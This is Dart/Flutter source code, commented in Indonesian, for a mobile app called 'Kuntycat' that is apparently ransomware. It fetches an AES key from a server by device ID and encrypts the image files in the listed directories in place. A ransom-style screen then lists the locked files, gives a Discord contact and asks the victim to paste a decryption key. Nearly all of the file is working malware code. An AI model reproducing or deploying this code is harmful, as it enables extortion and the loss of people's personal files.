import 'dart:io';
import 'dart:typed_data';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:path/path.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:image/image.dart' as img;

// Fungsi untuk meminta izin akses penyimpanan
Future<bool> requestStoragePermission() async {
  if (await Permission.storage.request().isGranted) {
    print("Izin akses penyimpanan diberikan");
    return true;
  } else {
    print("Izin akses penyimpanan ditolak");
    return false;
  }
}

// Fungsi untuk mendapatkan device ID
Future<String?> _getDeviceId() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  String? deviceId;

  if (Platform.isAndroid) {
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    deviceId = androidInfo.id;
  } else if (Platform.isIOS) {
    IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
    deviceId = iosInfo.identifierForVendor;
  }
  return deviceId;
}

// Fungsi untuk menyimpan device ID ke SharedPreferences
Future<void> _saveDeviceId(String deviceId) async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  await prefs.setString('device_id', deviceId);
}

// Fungsi untuk mendapatkan key enkripsi dari server
Future<encrypt.Key> _getEncryptionKey() async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  String? cachedKey = prefs.getString('encryption_key');
  String? deviceId = await _getDeviceId();
  // Cek jika kunci ada di cache
  if (cachedKey != null && cachedKey.length == 64) {
    print("Menggunakan kunci enkripsi dari cache");
    return _convertKeyFromString(cachedKey);
  }

  try {
    final response = await http.get(
      Uri.parse('https://example.com/get-encryption-key/$deviceId'),
    );

    if (response.statusCode == 200) {
      final data = jsonDecode(response.body);
      final keyString = data['key'];

      if (keyString.length == 64) {
        // Simpan kunci di cache
        await prefs.setString('encryption_key', keyString);
        return _convertKeyFromString(keyString);
      } else {
        throw Exception('Key tidak valid dari server');
      }
    } else {
      throw Exception('Gagal mendapatkan key dari server');
    }
  } catch (e) {
    print('Error mendapatkan key enkripsi dari server: $e');
    rethrow;
  }
}

encrypt.Key _convertKeyFromString(String keyString) {
  final keyBytes = List<int>.generate(
    32,
    (index) =>
        int.parse(keyString.substring(index * 2, index * 2 + 2), radix: 16),
  );
  return encrypt.Key(Uint8List.fromList(keyBytes));
}

// Fungsi untuk memeriksa apakah file adalah gambar
bool _isImageFile(String path) {
  return path.endsWith(".jpg") ||
      path.endsWith(".jpeg") ||
      path.endsWith(".png") ||
      path.endsWith(".gif");
}

// Fungsi untuk mengenkripsi file menggunakan key dari server
Future<void> _encryptFile(File file) async {
  try {
    List<int> fileBytes = await file.readAsBytes();
    img.Image? originalImage = img.decodeImage(fileBytes);

    if (originalImage == null) {
      print("File bukan gambar yang valid.");
      return;
    }

    final key = await _getEncryptionKey();

    if (![16, 24, 32].contains(key.bytes.length)) {
      throw Exception('Panjang kunci tidak valid: ${key.bytes.length}');
    }

    // Menggunakan IV acak untuk setiap enkripsi
    final iv = encrypt.IV.fromSecureRandom(16);
    final encrypter =
        encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));
    final encrypted = encrypter.encryptBytes(fileBytes, iv: iv);
    final output = Uint8List.fromList(iv.bytes + encrypted.bytes);

    await file.writeAsBytes(output);
    print("File berhasil terenkripsi: ${file.path}");
  } catch (e) {
    print("Gagal mengenkripsi file: $e");
  }
}

// Fungsi untuk mendekripsi file menggunakan kunci
Future<void> _decryptFileWithKey(File file, String keyString) async {
  try {
    if (keyString.length != 64) {
      throw Exception('Panjang kunci tidak valid. Harus 64 karakter hex.');
    }

    List<int> encryptedBytes = await file.readAsBytes();
    final key = _convertKeyFromString(keyString);

    final ivBytes = Uint8List.fromList(encryptedBytes.sublist(0, 16));
    final encryptedData = Uint8List.fromList(encryptedBytes.sublist(16));
    final iv = encrypt.IV(ivBytes);
    final encrypter =
        encrypt.Encrypter(encrypt.AES(key, mode: encrypt.AESMode.cbc));

    final decrypted =
        encrypter.decryptBytes(encrypt.Encrypted(encryptedData), iv: iv);

    await file.writeAsBytes(decrypted);
    print("File berhasil didekripsi: ${file.path}");
  } catch (e) {
    print("Gagal mendekripsi file: $e");
  }
}

// Fungsi untuk mengenkripsi file dalam direktori tertentu
Future<List<String>> encryptFilesInDirectories(List<String> directories) async {
  List<String> encryptedFiles = [];

  for (String directoryPath in directories) {
    final directory = Directory(directoryPath);
    if (await directory.exists()) {
      List<FileSystemEntity> files = directory.listSync();
      for (FileSystemEntity fileEntity in files) {
        if (fileEntity is File) {
          if (_isImageFile(fileEntity.path)) {
            await _encryptFile(fileEntity);
            encryptedFiles.add(fileEntity.path);
          }
        }
      }
    }
  }
  return encryptedFiles;
}

// Halaman untuk menampilkan daftar file terenkripsi dan didekripsi
class EncryptedFilesPage extends StatefulWidget {
  final List<String> encryptedFiles;

  EncryptedFilesPage({required this.encryptedFiles});

  @override
  _EncryptedFilesPageState createState() => _EncryptedFilesPageState();
}

class _EncryptedFilesPageState extends State<EncryptedFilesPage> {
  List<String> decryptedFiles = [];
  bool isDecrypted = false;
  TextEditingController _decryptionKeyController = TextEditingController();

  @override
  void initState() {
    super.initState();
    _initDeviceId();
  }

  // Fungsi untuk inisialisasi device ID
  Future<void> _initDeviceId() async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString('device_id');

    if (deviceId == null) {
      deviceId = await _getDeviceId() ?? 'unknown_device';
      await _saveDeviceId(deviceId);
      print("Device ID disimpan: $deviceId");
    } else {
      print("Device ID sudah ada: $deviceId");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color.fromARGB(255, 0, 0, 0),
      body: SafeArea(
        child: LayoutBuilder(
          builder: (context, constraints) {
            final screenWidth = constraints.maxWidth;
            final screenHeight = constraints.maxHeight;

            return SingleChildScrollView(
              child: Center(
                child: Padding(
                  padding: EdgeInsets.all(screenWidth * 0.04),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    crossAxisAlignment: CrossAxisAlignment.center,
                    children: [
                      Text(
                        'Kuntycat',
                        style: TextStyle(
                          color: Colors.white,
                          fontSize: screenWidth * 0.055,
                          fontWeight: FontWeight.bold,
                        ),
                        textAlign: TextAlign.center,
                      ),
                      SizedBox(height: screenHeight * 0.015),
                      Image.asset(
                        'assets/images/iconvpx.png',
                        height: screenHeight * 0.20,
                      ),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          // Ikon Discord
                          FaIcon(
                            FontAwesomeIcons.discord,
                            color: Colors.white,
                            size: 20,
                          ),
                          SizedBox(width: 5),
                          Text(
                            "Discord: kunttycat ",
                            style: GoogleFonts.inika(
                              color: Colors.white,
                              fontSize: 15,
                            ),
                            textAlign: TextAlign.center,
                          ),
                        ],
                      ),
                      SizedBox(height: screenHeight * 0.025),
                      Container(
                        constraints:
                            BoxConstraints(maxHeight: screenHeight * 0.35),
                        child: Card(
                          color: Colors.white,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(15),
                          ),
                          elevation: 8,
                          child: Padding(
                            padding: EdgeInsets.all(screenWidth * 0.035),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  isDecrypted
                                      ? 'Decrypted Files:'
                                      : 'Encrypted Files:',
                                  style: TextStyle(
                                    fontSize: screenWidth * 0.045,
                                    fontWeight: FontWeight.bold,
                                    color: Colors.black,
                                  ),
                                ),
                                SizedBox(height: screenHeight * 0.01),
                                Expanded(
                                  child: ListView.builder(
                                    itemCount: isDecrypted
                                        ? decryptedFiles.length
                                        : widget.encryptedFiles.length,
                                    itemBuilder: (context, index) {
                                      String fileName = isDecrypted
                                          ? basename(decryptedFiles[index])
                                          : basename(
                                              widget.encryptedFiles[index]);
                                      return ListTile(
                                        leading: Icon(
                                          isDecrypted
                                              ? Icons.file_present
                                              : Icons.lock,
                                          color: isDecrypted
                                              ? Colors.green
                                              : Colors.redAccent,
                                        ),
                                        title: Text(
                                          fileName,
                                          style: TextStyle(
                                            color: Colors.black,
                                          ),
                                        ),
                                      );
                                    },
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ),
                      ),
                      SizedBox(height: screenHeight * 0.025),
                      TextField(
                        controller: _decryptionKeyController,
                        obscureText: true,
                        decoration: InputDecoration(
                          labelText: 'Paste Key Decryption',
                          filled: true,
                          fillColor: Colors.white,
                          border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(10),
                          ),
                        ),
                      ),
                      SizedBox(height: screenHeight * 0.025),
                      ElevatedButton(
                        onPressed: () async {
                          final keyString =
                              _decryptionKeyController.text.trim();
                          if (keyString.isNotEmpty) {
                            showDialog(
                              context: context,
                              barrierDismissible: false,
                              builder: (context) =>
                                  Center(child: CircularProgressIndicator()),
                            );
                            for (var file in widget.encryptedFiles) {
                              await _decryptFileWithKey(File(file), keyString);
                              decryptedFiles.add(file);
                            }
                            Navigator.of(context).pop();

                            setState(() {
                              isDecrypted = true;
                            });
                            ScaffoldMessenger.of(context).showSnackBar(
                              SnackBar(
                                  content:
                                      Text('Files decrypted successfully')),
                            );
                            Future.delayed(Duration(seconds: 2), () {
                              SystemNavigator.pop();
                            });
                          }
                        },
                        style: ElevatedButton.styleFrom(
                          backgroundColor: const Color.fromARGB(255, 255, 0, 0),
                          foregroundColor: Colors.white,
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(10),
                          ),
                          padding: EdgeInsets.symmetric(
                            horizontal: screenWidth * 0.18,
                            vertical: screenHeight * 0.015,
                          ),
                        ),
                        child: Text(
                          'DECRYPT',
                          style: TextStyle(fontSize: screenWidth * 0.04),
                        ),
                      ),
                      SizedBox(height: screenHeight * 0.02),
                      Text(
                        "Version 1.0",
                        style: TextStyle(
                          fontSize: screenWidth * 0.035,
                          fontWeight: FontWeight.bold,
                          color: Colors.white,
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            );
          },
        ),
      ),
    );
  }
}
